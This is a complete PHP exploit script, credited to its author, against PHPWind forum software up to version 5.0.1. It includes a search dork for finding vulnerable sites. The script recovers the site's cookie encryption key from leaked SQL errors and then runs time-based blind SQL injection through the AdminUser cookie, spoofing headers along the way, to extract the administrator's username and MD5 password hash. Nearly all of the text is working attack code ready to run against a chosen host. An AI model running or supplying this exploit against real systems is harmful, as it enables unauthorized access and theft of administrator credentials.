<?php
print_r('
--------------------------------------------------------------------------------
PHPWind <= 5.0.1 "AdminUser" blind SQL injection exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: "powered by phpwind"
--------------------------------------------------------------------------------
');

if ($argc<3) {
    print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to phpwind
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /phpwind/ -P1.1.1.1:80
php '.$argv[0].' localhost / -p81
--------------------------------------------------------------------------------
');
    die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "please wait...\n";

function StrCode($string,$action='ENCODE'){
	$key	= $GLOBALS['my_fragment'];
	$string	= $action == 'ENCODE' ? $string : base64_decode($string);
	$len	= 18;
	$code	= '';
	for($i=0; $i<strlen($string); $i++){
		$k		= $i % $len;
		$code  .= $string[$i] ^ $key[$k];
	}
	$code = $action == 'DECODE' ? $code : base64_encode($code);
	return $code;
}

function random($length) {
	$hash = '';
	$chars = '0123456789abcdef';
	$max = strlen($chars) - 1;
	mt_srand((double)microtime() * 1000000);
	for($i = 0; $i < $length; $i++) {
		$hash .= $chars[mt_rand(0, $max)];
	}
	return $hash;
}
/*
  Works regardless of magic_quotes_gpc because of base64_decode()...
  this returns the strpos(x,8,18) $_GLOBALS['db_hash'] fragment.
  You could be able to escalate privileges if you succeed to
  retrieve the left and the right one, TO bypass the SafeCheck()
  function...
  so, this time, injection method is blind with delays
  you will have the md5 admin hash...
*/

//need cookie prefix...
$packet ="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
$packet.="Host: ".$host."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("lastfid=",$html);
$temp2=explode("Set-Cookie: ",$temp[0]);
$cp=$temp2[1];
echo "cookie prefix -> ".$cp."\n";

//see sql errors... you need a valid key for strcodeii() function,
//so let's ask :)
$tt="\t";for ($i=1; $i<=255; $i++){$tt.=chr($i);}
while (1)
{
    $GLOBALS['my_fragment']=random(18);
    $au=StrCode($tt,"ENCODE");
    $packet ="GET ".$p."admin.php HTTP/1.0\r\n";
    $packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
    $packet.="Host: ".$host."\r\n";
    $packet.="Cookie: ".$cp."AdminUser=".$au.";\r\n";
    $packet.="Accept: text/plain\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);
    $html=html_entity_decode($html);
    $html=str_replace("<br />","",$html);
    if ((eregi("WHERE username='",$html)) and (eregi("You Can Get Help In",$html))){
        $temp=explode("WHERE username='",$html);
        $temp2=explode("'<br>",$temp[1]);
        $decoded=$temp2[0];
        if (strlen($decoded)==255) break;
    }
}

$decoded="\t".$decoded;
$temp = $au;

//calculating key...
$key="";
for ($j=0; $j<18;  $j++){
    for ($i=0; $i<255; $i++){
        $aa="";
        if ($j<>0){
            for ($k=1; $k<=$j; $k++){
                $aa.="a";
            }
        }
        $GLOBALS['my_fragment']=$aa.chr($i);
        $t = StrCode($temp,"DECODE");
        if ($t[$j]==$decoded[$j]){
            $key.=chr($i);
        }
   }
}

function is_my_key($fragment)
{
 if (ereg("^[a-f0-9]{18}",trim($fragment))) {return true;}
 else {return false;}
}

if (is_my_key($key)){
    echo "encryption key ->".$key."\n";
    $GLOBALS['my_fragment']=$key;
}
else
{die("unable to retrieve the magic key...");}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
while (!strstr($password,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
            //you can use every char because of base64_decode()...so this bypass magic quotes...
            $sql="9999999'/**/OR/**/(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),benchmark(1000000,sha1(\"suntzu\")),-1))/**/AND/**/groupid=3/**/LIMIT/**/1/*";
            echo "sql -> ".$sql."\n";
            $packet ="GET ".$p."admin.php HTTP/1.0\r\n";
            $packet.="CLIENT-IP: 1.2.3.4\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Cookie: ".$cp."AdminUser=".StrCode("9999999999\t".$sql,"ENCODE").";\r\n";
            $packet.="Accept: text/plain\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            sendpacketii($packet);
            usleep(2000000);
            $starttime=time();
            echo "starttime -> ".$starttime."\r\n";
            sendpacketii($packet);
            $endtime=time();
            echo "endtime -> ".$endtime."\r\n";
            $difftime=$endtime - $starttime;
            echo "difftime -> ".$difftime."\r\n";
            if ($difftime > 10) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}

$j=1;$admin="";
while (!strstr($admin,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
            $sql="9999999'/**/OR/**/(IF((ASCII(SUBSTRING(username,".$j.",1))=".$i."),benchmark(1000000,sha1(\"suntzu\")),-1))/**/AND/**/groupid=3/**/LIMIT/**/1/*";
            echo "sql -> ".$sql."\n";
            $packet ="GET ".$p."admin.php HTTP/1.0\r\n";
            $packet.="CLIENT-IP: 1.2.3.4\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Cookie: ".$cp."AdminUser=".StrCode("9999999999\t".$sql,"ENCODE").";\r\n";
            $packet.="Accept: text/plain\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            sendpacketii($packet);
            usleep(2000000);
            $starttime=time();
            echo "starttime -> ".$starttime."\r\n";
            sendpacketii($packet);
            $endtime=time();
            echo "endtime -> ".$endtime."\r\n";
            $difftime=$endtime - $starttime;
            echo "difftime -> ".$difftime."\r\n";
            if ($difftime > 10) {$admin.=chr($i);echo "admin -> ".$admin."[???]\r\n";sleep(2);break;}
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($password)) {
    print_r('
--------------------------------------------------------------------------------
admin user     -> '.$admin.'
pwd hash (md5) -> '.$password.'
--------------------------------------------------------------------------------
');
}
else {
   echo "exploit failed...";
}
?>


